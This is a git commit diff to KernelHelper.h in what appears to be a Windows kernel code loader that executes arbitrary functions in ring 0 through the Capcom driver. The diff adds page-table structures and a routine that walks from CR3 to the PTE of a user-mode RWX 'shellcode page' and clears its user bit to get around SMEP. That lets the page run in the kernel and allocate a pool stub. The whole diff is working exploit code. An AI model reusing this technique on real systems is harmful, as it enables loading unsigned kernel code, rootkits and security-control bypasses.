7f977f58dcef8394d93c3b1e3c2e9d6227002504
Can Bölük <can1357@users.noreply.github.com>
2018-05-27 04:56:16 +0300

    Added support for kernel pools using low-fragmentation heap (Windows 1803)

--- KernelHelper.h
+++ KernelHelper.h
@@ -5,10 +5,128 @@
 #include "LockedMemory.h"
 #include "CapcomLoader.h"
 
+#ifndef PFN_TO_PAGE
+#define PFN_TO_PAGE(pfn) ( pfn << 12 )
+#pragma pack(push, 1)
+typedef union CR3_
+{
+	uint64_t value;
+	struct
+	{
+		uint64_t ignored_1 : 3;
+		uint64_t write_through : 1;
+		uint64_t cache_disable : 1;
+		uint64_t ignored_2 : 7;
+		uint64_t pml4_p : 40;
+		uint64_t reserved : 12;
+	};
+} PTE_CR3;
+
+typedef union VIRT_ADDR_
+{
+	uint64_t value;
+	void *pointer;
+	struct
+	{
+		uint64_t offset : 12;
+		uint64_t pt_index : 9;
+		uint64_t pd_index : 9;
+		uint64_t pdpt_index : 9;
+		uint64_t pml4_index : 9;
+		uint64_t reserved : 16;
+	};
+} VIRT_ADDR;
+
+typedef uint64_t PHYS_ADDR;
+
+typedef union PML4E_
+{
+	uint64_t value;
+	struct
+	{
+		uint64_t present : 1;
+		uint64_t rw : 1;
+		uint64_t user : 1;
+		uint64_t write_through : 1;
+		uint64_t cache_disable : 1;
+		uint64_t accessed : 1;
+		uint64_t ignored_1 : 1;
+		uint64_t reserved_1 : 1;
+		uint64_t ignored_2 : 4;
+		uint64_t pdpt_p : 40;
+		uint64_t ignored_3 : 11;
+		uint64_t xd : 1;
+	};
+} PML4E;
+
+typedef union PDPTE_
+{
+	uint64_t value;
+	struct
+	{
+		uint64_t present : 1;
+		uint64_t rw : 1;
+		uint64_t user : 1;
+		uint64_t write_through : 1;
+		uint64_t cache_disable : 1;
+		uint64_t accessed : 1;
+		uint64_t dirty : 1;
+		uint64_t page_size : 1;
+		uint64_t ignored_2 : 4;
+		uint64_t pd_p : 40;
+		uint64_t ignored_3 : 11;
+		uint64_t xd : 1;
+	};
+} PDPTE;
+
+typedef union PDE_
+{
+	uint64_t value;
+	struct
+	{
+		uint64_t present : 1;
+		uint64_t rw : 1;
+		uint64_t user : 1;
+		uint64_t write_through : 1;
+		uint64_t cache_disable : 1;
+		uint64_t accessed : 1;
+		uint64_t dirty : 1;
+		uint64_t page_size : 1;
+		uint64_t ignored_2 : 4;
+		uint64_t pt_p : 40;
+		uint64_t ignored_3 : 11;
+		uint64_t xd : 1;
+	};
+} PDE;
+
+typedef union PTE_
+{
+	uint64_t value;
+	VIRT_ADDR vaddr;
+	struct
+	{
+		uint64_t present : 1;
+		uint64_t rw : 1;
+		uint64_t user : 1;
+		uint64_t write_through : 1;
+		uint64_t cache_disable : 1;
+		uint64_t accessed : 1;
+		uint64_t dirty : 1;
+		uint64_t pat : 1;
+		uint64_t global : 1;
+		uint64_t ignored_1 : 3;
+		uint64_t page_frame : 40;
+		uint64_t ignored_3 : 11;
+		uint64_t xd : 1;
+	};
+} PTE;
+#pragma pack(pop)
+#endif
+
+
 // Not thread safe!
 using fnPassiveCall = uint64_t( *)( ... );
 
-NON_PAGED_DATA static fnFreeCall Khk_ExAllocatePool = 0;
 NON_PAGED_DATA static fnPassiveCall Khk_PassiveCallStub = 0;
 
 static const uint32_t Kh_PassiveCallStubCallStoreOffset = 0x34;
@@ -35,20 +153,45 @@ NON_PAGED_DATA static UCHAR Kh_PassiveCallStubData[] =
 };
 
 
-// This function is the only _TRICKY_ part of this project.
-// ExAllocatePool does not require interrupts to be enabled WHEN the size is small and we are depending on that.
-NON_PAGED_CODE static void Khk_AllocatePassiveStub()
-{
-	PVOID Out = ( PVOID ) Khk_ExAllocatePool( 0ull, sizeof( Kh_PassiveCallStubData ) );
-	Np_memcpy( Out, Kh_PassiveCallStubData, sizeof( Kh_PassiveCallStubData ) );
-	Khk_PassiveCallStub = ( fnPassiveCall ) Out;
-}
+
+NON_PAGED_DATA static fnFreeCall Khk_ExAllocatePool = 0;
+NON_PAGED_DATA static fnFreeCall Khk_MmGetVirtualForPhysical = 0;
+NON_PAGED_DATA static PVOID Kh_ShellCodePage = 0;
 
 template<typename ...Params>
 NON_PAGED_CODE static uint64_t Khk_CallPassive( PVOID Ptr, Params &&... params )
 {
 	*( PVOID* ) ( ( ( PUCHAR ) Khk_PassiveCallStub ) + Kh_PassiveCallStubCallStoreOffset ) = Ptr;
 	return Khk_PassiveCallStub( std::forward<Params>( params ) ... );
+}
+
+NON_PAGED_CODE static void Khk_AllocatePassiveStub()
+{
+	VIRT_ADDR Addr;
+	Addr.pointer = Kh_ShellCodePage;
+	PTE_CR3 Cr3 = { __readcr3() };
+
+	auto Pml4e = ( PML4E * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Cr3.pml4_p ) + sizeof( PML4E ) * Addr.pml4_index );
+	if ( !Pml4e || !Pml4e->present )
+		return;
+	auto Pdpte = ( PDPTE * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Pml4e->pdpt_p ) + sizeof( PDPTE ) * Addr.pdpt_index );
+	if ( !Pdpte || !Pdpte->present )
+		return;
+	auto Pde = ( PDE * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Pdpte->pd_p ) + sizeof( PDE ) * Addr.pd_index );
+	if ( !Pde || !Pde->present || Pde->page_size )
+		return;
+	auto Pte = ( PTE * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Pde->pt_p ) + sizeof( PDE ) * Addr.pt_index );
+	if ( !Pte || !Pte->present )
+		return;
+
+	Pte->user = FALSE;
+
+	Khk_PassiveCallStub = fnPassiveCall( Kh_ShellCodePage );
+	PVOID Out = ( PVOID ) Khk_CallPassive( Khk_ExAllocatePool, 0ull, sizeof( Kh_PassiveCallStubData ) );
+	Np_memcpy( Out, Kh_PassiveCallStubData, sizeof( Kh_PassiveCallStubData ) );
+	Khk_PassiveCallStub = ( fnPassiveCall ) Out;
+
+	Pte->user = TRUE;
 }
 
 static void Khu_Init( CapcomContext* CpCtx, KernelContext* KrCtx )
@@ -66,5 +209,14 @@ static void Khu_Init( CapcomContext* CpCtx, KernelContext* KrCtx )
 	}
 
 	Khk_ExAllocatePool = KrCtx->GetProcAddress<fnFreeCall>( "ExAllocatePool" );
+	Khk_MmGetVirtualForPhysical = KrCtx->GetProcAddress<fnFreeCall>( "MmGetVirtualForPhysical" );
+
+	Kh_ShellCodePage = VirtualAlloc( 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+	memcpy( Kh_ShellCodePage, Kh_PassiveCallStubData, sizeof( Kh_PassiveCallStubData ) );
+	VirtualLock( Kh_ShellCodePage, 0x1000 );
+
 	CpCtx->ExecuteInKernel( Khk_AllocatePassiveStub );
+	assert( Khk_PassiveCallStub );
+
+	VirtualFree( Kh_ShellCodePage, 0, MEM_RELEASE );
 }
